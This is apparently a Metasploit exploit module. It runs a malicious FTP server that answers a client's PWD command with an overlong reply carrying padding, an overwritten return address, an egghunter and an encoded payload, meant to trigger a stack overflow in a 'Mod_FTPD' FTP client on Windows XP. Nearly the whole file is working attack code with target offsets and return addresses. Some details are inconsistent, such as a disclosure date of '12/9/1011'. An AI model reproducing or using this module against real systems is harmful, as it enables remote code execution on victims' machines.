# $Id: Mod_FTPD_server.rb 16897 2011-9-12 19:03:24Z Iraq $
##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Exploit::Remote::FtpServer
    include Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Mod_FTPD Stack Buffer Overflow Exploit',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in Mod_FTPD The overflow gets
                triggered when the ftp clients tries to process an overly response to a PWD command.
                This will overwrite the saved EIP and structured exception handler.
            },
            'Author'     =>
                [
                    'Angel Injection'
                ],
            'License'        => MSF_LICENSE,
            'Version'        => "$Revision: 16897 $",
            'References'     =>
                [
                    [ 'OSVDB', '16897'],
                    [ 'URL', 'http://1337day.com/exploits/16899' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload'        =>
                {
                    'BadChars' => "\x00\xfd\x0e\x7c\x2e\x0d",
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Windows XP Universal', { 'Offset' => 399, 'Ret' => 0x779A5483  } ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => '12/9/1011',
            'DefaultTarget'  => 0))
 
    end
 
 
    def setup
        super
    end
 
    def on_client_unknown_command(c,cmd,arg)
        c.put("200 OK\r\n")
    end
 
 
    def on_client_command_pwd(c,arg)
 
        badchars = ""
        eggoptions =
        {
        :checksum => true,
        :eggtag => "root"
        }
        hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)
 
        print_status(" - PWD command -> Sending payload")
        junk = "A" * target['Offset']
        nops = "A" * 10
        tweakhunter = "\x5a\x5a"
        eip = [target.ret].pack('V')
        buffer = junk + eip + nops + tweakhunter + hunter + egg
        pwdoutput = "257  \"/" + buffer+ "\" is current directory\r\n"
        c.put(pwdoutput)
        print_status(" - Sent #{pwdoutput.length} bytes, wait for hunter")
        return
 
    end
 
end



